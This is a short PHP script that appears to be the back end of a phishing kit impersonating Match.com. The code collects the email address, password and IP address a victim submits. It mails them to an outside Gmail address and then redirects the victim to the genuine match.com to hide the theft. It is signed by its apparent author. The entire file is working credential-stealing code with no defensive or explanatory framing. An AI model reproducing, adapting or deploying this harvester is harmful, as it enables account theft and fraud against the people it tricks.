<?
                                                                                                                                                                                                                                    
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Match result by MaXx--------\n";
$message .= "Email Address : ".$_POST['username']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "---------------Created BY M4xX-----------\n";
$send = "kisslisa2444@gmail.com";
$subject = "Match rezults";


mail($send,$subject,$message,$headers);


$redirect = "http://match.com";

header("Location: " . $redirect);
 
?>